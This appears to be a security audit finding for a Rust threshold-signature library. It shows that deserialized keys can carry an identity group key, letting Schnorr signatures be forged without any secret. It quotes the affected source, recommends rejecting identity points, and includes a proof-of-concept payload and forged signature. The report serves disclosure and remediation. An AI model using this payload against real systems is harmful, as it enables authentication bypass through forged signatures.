### Title

`ThresholdKeys::read` accepts identity verification shares, producing a forgeable identity group key - (File: `crypto/dkg/src/lib.rs`)

### Summary

`ThresholdKeys::read` accepts canonical identity points as verification shares, and `ThresholdKeys::new` derives the group key without rejecting them, allowing an attacker-controlled serialized key to deserialize with the identity as its group key. [1](#0-0) [2](#0-1) 

A Schnorr verifier using that group key accepts signatures without knowledge of any private key because the public-key term vanishes when the key is identity. [3](#0-2) 

### Finding Description

`ThresholdKeys::read` reads `n` verification shares through `Ciphersuite::read_G` and passes them directly to `ThresholdKeys::new`. [1](#0-0) 

`Ciphersuite::read_G` verifies only that a point decodes and re-encodes canonically; it does not reject the identity point. [4](#0-3) 

For Ristretto, a canonical identity encoding is accepted because `from_bytes` returns the decoded identity and the Ristretto filter admits all decompressed points. [5](#0-4) [6](#0-5) 

`ThresholdKeys::new` checks the number and indexes of verification shares, then computes `group_key` as their interpolated sum without checking that either the shares or resulting key are non-identity. [7](#0-6) 

This contrasts with FROST’s own point parser, which explicitly rejects identity points. [8](#0-7) 

### Impact Explanation

An attacker can supply a serialized `ThresholdKeys<Ristretto>` whose verification shares are all the identity encoding, causing `group_key()` to be identity. [2](#0-1) 

Schnorr verification checks `R + cA - sG = 0`; with `A = identity`, the signature `(R = identity, s = 0)` is valid for every challenge, as is any `(R = sG, s)`. [3](#0-2) 

Therefore, any authentication path that deserializes untrusted `ThresholdKeys` and trusts the resulting group key can be bypassed with a forged signature requiring no secret share. [9](#0-8) [10](#0-9) 

### Likelihood Explanation

Exploitation requires an application to accept serialized threshold keys from an untrusted party and authenticate using the embedded group key, which is precisely the exposed `ThresholdKeys::read` input path. [11](#0-10) 

For Ristretto, the payload is deterministic and consists only of valid parameters, a zero scalar, and canonical identity encodings, so no race, secret knowledge, or protocol participation is needed. [5](#0-4) [6](#0-5) 

### Recommendation

Reject identity verification shares and an identity resulting `group_key` inside `ThresholdKeys::new`, so both direct construction and `ThresholdKeys::read` inherit the invariant. [12](#0-11) 

Also consider rejecting a zero `secret_share` and identity public keys at signature-verification boundaries, matching the explicit identity rejection already used by `Curve::read_G`. [8](#0-7) [13](#0-12) 

### Proof of Concept

For Ristretto, the following serialized `t=1, n=1, i=1` key contains a zero secret share and an all-zero identity verification share:

```rust
// crypto/dkg/src/lib.rs + crypto/schnorr/src/lib.rs

let mut encoded = vec![];

// C::ID = b"ristretto", length-prefixed as u32le.
encoded.extend(9u32.to_le_bytes());
encoded.extend(b"ristretto");

// t = 1, n = 1, i = 1.
encoded.extend(1u16.to_le_bytes());
encoded.extend(1u16.to_le_bytes());
encoded.extend(1u16.to_le_bytes());

// Interpolation::Lagrange.
encoded.push(1);

// secret_share = 0.
encoded.extend([0u8; 32]);

// verification_shares[1] = canonical Ristretto identity.
encoded.extend([0u8; 32]);

let keys =
  ThresholdKeys::<Ristretto>::read(&mut encoded.as_slice()).unwrap();

assert!(bool::from(keys.group_key().is_identity()));

let forged = SchnorrSignature::<Ristretto> {
  R: <Ristretto as Ciphersuite>::G::identity(),
  s: <Ristretto as Ciphersuite>::F::ZERO,
};

// Valid for any challenge because c * identity = identity.
assert!(forged.verify(keys.group_key(), challenge));
```

The deserialized key reaches identity because every verification share is identity and `group_key` is their sum. [2](#0-1)

### Citations

**File:** crypto/dkg/src/lib.rs (L349-390)
```rust
  pub fn new(
    params: ThresholdParams,
    interpolation: Interpolation<C::F>,
    secret_share: Zeroizing<C::F>,
    verification_shares: HashMap<Participant, C::G>,
  ) -> Result<ThresholdKeys<C>, DkgError> {
    if verification_shares.len() != usize::from(params.n()) {
      Err(DkgError::IncorrectAmountOfVerificationShares {
        n: params.n(),
        shares: verification_shares.len(),
      })?;
    }
    for participant in verification_shares.keys().copied() {
      if u16::from(participant) > params.n() {
        Err(DkgError::InvalidParticipant { n: params.n(), participant })?;
      }
    }

    match &interpolation {
      Interpolation::Constant(_) => {
        if params.t() != params.n() {
          Err(DkgError::InapplicableInterpolation("constant interpolation for keys where t != n"))?;
        }
      }
      Interpolation::Lagrange => {}
    }

    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

    Ok(ThresholdKeys {
      core: Arc::new(Zeroizing::new(ThresholdCore {
        params,
        interpolation,
        secret_share,
        group_key,
        verification_shares,
      })),
      scalar: C::F::ONE,
      offset: C::F::ZERO,
    })
```

**File:** crypto/dkg/src/lib.rs (L573-630)
```rust
  /// Read keys from a type satisfying `std::io::Read`.
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
```

**File:** crypto/schnorr/src/lib.rs (L88-110)
```rust
  pub fn batch_statements(&self, public_key: C::G, challenge: C::F) -> [(C::F, C::G); 3] {
    // s = r + ca
    // sG == R + cA
    // R + cA - sG == 0
    [
      // R
      (C::F::ONE, self.R),
      // cA
      (challenge, public_key),
      // -sG
      (-self.s, C::generator()),
    ]
  }

  /// Verify a Schnorr signature for the given key with the specified challenge.
  ///
  /// This challenge must be properly crafted, which means being binding to the public key, nonce,
  /// and any message. Failure to do so will let a malicious adversary to forge signatures for
  /// different keys/messages.
  #[must_use]
  pub fn verify(&self, public_key: C::G, challenge: C::F) -> bool {
    multiexp_vartime(&self.batch_statements(public_key, challenge)).is_identity().into()
  }
```

**File:** crypto/ciphersuite/src/lib.rs (L91-100)
```rust
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
```

**File:** crypto/dalek-ff-group/src/lib.rs (L429-436)
```rust
      fn from_bytes(bytes: &Self::Repr) -> CtOption<Self> {
        let decompressed = $DCompressed(*bytes).decompress();
        // TODO: Same note on unwrap_or as above
        let point = decompressed.unwrap_or($DPoint::identity());
        CtOption::new(
          $Point(point),
          choice(black_box(decompressed).is_some()) & choice($torsion_free(point)),
        )
```

**File:** crypto/dalek-ff-group/src/lib.rs (L486-494)
```rust
dalek_group!(
  RistrettoPoint,
  DRistrettoPoint,
  |_| true,
  RistrettoBasepointTable,
  CompressedRistretto,
  RISTRETTO_BASEPOINT_POINT,
  RISTRETTO_BASEPOINT_TABLE
);
```

**File:** crypto/frost/src/curve/mod.rs (L123-130)
```rust
  /// Read a point from a reader, rejecting identity.
  #[allow(non_snake_case)]
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let res = <Self as Ciphersuite>::read_G(reader)?;
    if res.is_identity().into() {
      Err(io::Error::other("identity point"))?;
    }
    Ok(res)
```
